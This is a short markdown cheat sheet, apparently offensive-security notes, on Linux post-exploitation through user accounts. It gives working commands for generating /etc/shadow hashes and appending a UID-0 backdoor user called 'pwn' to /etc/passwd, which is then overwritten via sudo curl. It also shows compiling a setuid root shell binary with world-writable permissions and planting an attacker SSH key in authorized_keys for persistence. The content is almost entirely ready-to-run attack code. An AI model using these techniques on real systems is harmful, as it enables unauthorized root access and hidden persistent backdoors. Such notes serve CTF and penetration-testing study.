# Users

## `/etc/shadow` Password

```bash
openssl passwd -6 -salt salty Password123$
```

```bash
genpasswd() { openssl passwd -6 -salt $1 $2 ; }
genpasswd salty Password123$
```

## Add New Root

```bash
# Get copy
$ cp /etc/passwd . 
# Add new user
$ echo "pwn:$(openssl passwd -6 -salt SALT PASSWORD):0:0:root:/root:/bin/bash" >> passwd
# Update somehow
$ sudo curl file:///home/user/passwd -so /etc/passwd
# Become user
$ su - pwn
```

## Impersonate User

Compile the binary to become UID=0, so **root**.
```bash
echo $'#include <unistd.h>\n#include <sys/types.h>\nvoid main() { setreuid(0,0); setregid(0,0); execl("/bin/sh", "sh", NULL); }' | gcc -x c -static -o privesc -
echo $'#include <unistd.h>\n#include <sys/types.h>\nvoid main() { setreuid(0,0); setregid(0,0); execl("/bin/bash", "bash", "-p", NULL); }' | gcc -x c -static -o privesc -
```

> Works better with bash

Make binary SUID, owner the user you want to impersonate and give all perms for fun~ (Make sure it has exec)
```bash
install -m4777 privesc rootsh
```

```bash
# id
uid=0(root) gid=0(root) groups=1000(lowLevelUserGroups)
```

## Upgrade to SSH

Local

```bash
└─$ ssh-keygen -f id_rsa -P PASSWORD -q
└─$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys" | tee entry
mkdir ~/.ssh; echo 'ssh-ed25519 AAAA...lPRe user@pc' >> ~/.ssh/authorized_keys
```

Remote
```bash
mkdir ~/.ssh; echo 'ssh-ed25519 AAAA...lPRe user@pc' >> ~/.ssh/authorized_keys
```

::: info Note
Might need to change `~` if HOME is not set.
:::